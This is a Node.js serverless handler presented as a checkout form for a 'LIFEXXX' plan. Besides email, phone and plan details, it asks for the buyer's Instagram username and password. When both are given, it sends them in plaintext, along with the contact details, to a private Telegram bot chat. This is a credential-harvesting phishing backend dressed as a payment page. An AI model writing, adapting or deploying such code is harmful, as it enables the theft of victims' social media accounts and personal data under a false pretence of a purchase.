const EMAIL_PATTERN = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const clean = (value, limit) => String(value || '').trim().replace(/\s+/g, ' ').slice(0, limit);

module.exports = async (request, response) => {
  response.setHeader('Cache-Control', 'no-store');

  if (request.method !== 'POST') {
    response.status(405).json({ error: 'Method not allowed' });
    return;
  }

  const allowedOrigin = process.env.SITE_ORIGIN || 'https://lifexxx.vercel.app';
  const origin = request.headers.origin;
  if (origin && origin !== allowedOrigin) {
    response.status(403).json({ error: 'Origin not allowed' });
    return;
  }

  const body = typeof request.body === 'string' ? JSON.parse(request.body || '{}') : request.body || {};
  const email = clean(body.email, 254).toLowerCase();
  const accountName = clean(body.accountName, 64);
  const password = clean(body.password, 64);
  const confirmPassword = clean(body.confirmPassword, 64);
  const phone = clean(body.phone, 32);
  const instagramUsername = clean(body.instagramUsername, 64);
  const instagramPassword = clean(body.instagramPassword, 64);
  const product = clean(body.product, 80);
  const price = clean(body.price, 24);

  if (!EMAIL_PATTERN.test(email) || !accountName || !password || !confirmPassword || !phone || !product || !price) {
    response.status(400).json({ error: 'Invalid checkout details' });
    return;
  }

  if (password !== confirmPassword) {
    response.status(400).json({ error: 'Passwords do not match' });
    return;
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    response.status(503).json({ error: 'Notifications are not configured' });
    return;
  }

  let telegramText = `New LIFEXXX checkout\\nPlan: ${product}\\nAmount: $${price} USD\\nAccount name: ${accountName}\\nPhone: ${phone}\\nEmail: ${email}`;
  if (instagramUsername && instagramPassword) {
    telegramText += `\\nInstagram: ${instagramUsername}\\nInstagram Password: ${instagramPassword}`;
  }

  const telegram = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: telegramText
    })
  });

  if (!telegram.ok) {
    response.status(502).json({ error: 'Notification delivery failed' });
    return;
  }

  response.status(204).end();
};
